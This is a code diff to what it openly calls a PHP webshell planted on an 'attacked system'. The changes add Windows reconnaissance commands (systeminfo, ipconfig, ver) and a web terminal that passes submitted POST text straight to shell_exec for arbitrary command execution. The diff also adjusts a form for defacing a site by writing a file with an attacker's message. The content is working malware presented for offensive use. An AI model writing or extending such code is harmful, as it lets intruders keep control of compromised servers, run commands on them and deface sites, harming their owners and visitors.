@@ -343,9 +343,6 @@ class GettingPages
         } else {
           $writable_or_not = "<b style='color: #DC143C;'>[not writable]</b>";
         }
-
-        // check if ifconfig is installed on this webserver (net tools).
-        // making function
       }
 
       // attacked system is based on windows.
@@ -353,8 +350,17 @@ class GettingPages
       {
         // if our webshell is placed on a windows webserver for example, we need to change commands
         // because windows does not have linux commands on their system. (logical)
-        $readpasswdconf = shell_exec('ipconfig');
-        $internalconfig = shell_exec('net user');
+        $readpasswdconf     = shell_exec('systeminfo');
+        $internalconfig     = shell_exec('ipconfig');
+        $distributionname   = shell_exec('systeminfo | findstr Build');
+        $kernelversioncheck = shell_exec('ver');
+
+        if(is_writable($s_rootdoc))
+        {
+          $writable_or_not = "<b style='color: yellow;'>[writable]</b>";
+        } else {
+          $writable_or_not = "<b style='color: #DC143C'>[not writable]</b>";
+        }
       }
 
       echo "<code style='font-size: 13px; color: grey;'><h2 style='color:#DC143C;'>Server security info</h2><hr>
@@ -368,7 +374,7 @@ class GettingPages
 
       <b style='color:#DC143C;'>Distribution: </b>".$distributionname."<br>
       <b style='color:#DC143C;'>Kernel: </b>".$kernelversioncheck."<br>
-      <b style='color:#DC143C;'>passwd config: </b><br><textarea rows='30' cols='100' style='
+      <b style='color:#DC143C;'>passwd config(or systeminfo): </b><br><textarea rows='30' cols='100' style='
       resize: none; color: white; background-color: black; border: none;'
       readonly>".$readpasswdconf."</textarea><br>
       <br>
@@ -508,6 +514,22 @@ class GettingPages
       if(PHP_OS_FAMILY === 'Windows')
       {
 
+        if(isset($_POST['submit']))
+        {
+
+          // making var for input
+          $terminal_win = $_POST['terminal'];
+
+          if(isset($terminal_win))
+          {
+            $output = preg_split('/[n]/', shell_exec($terminal_win." 2>&1"));
+            foreach($output as $line)
+            {
+              echo htmLentities($line, ENT_QUOTES | ENT_HTML5, 'UTF-8');
+            }
+            die();
+          }
+        }
       }
     }
   }
@@ -534,14 +556,16 @@ class GettingPages
       Border-bottom: 1px solid rgb(0,0,0);
       background-color: transparent;
       outline: none;
-      color: white;'><br><br>
+      color: white;
+      width: 300px;'><br><br>
       File name:<br> <input type='text' name='filename'
-      required placeholder='example: index.html/php' style='display: inline-block;
+      required placeholder='example: index.html/php...' style='display: inline-block;
       border: none;
       Border-bottom: 1px solid rgb(0,0,0);
       background-color: transparent;
       outline: none;
-      color: white;'><br><br>
+      color: white;
+      width: 300px;'><br><br>
       message : <br><textarea type='text' cols='50' rows='25' required
       style='resize: none; color: white; background-color: black; border: none;' name='defacemessage'></textarea>
       <button type='submit' value='submit' name='go' style='background-color: rgb(0,0,0);
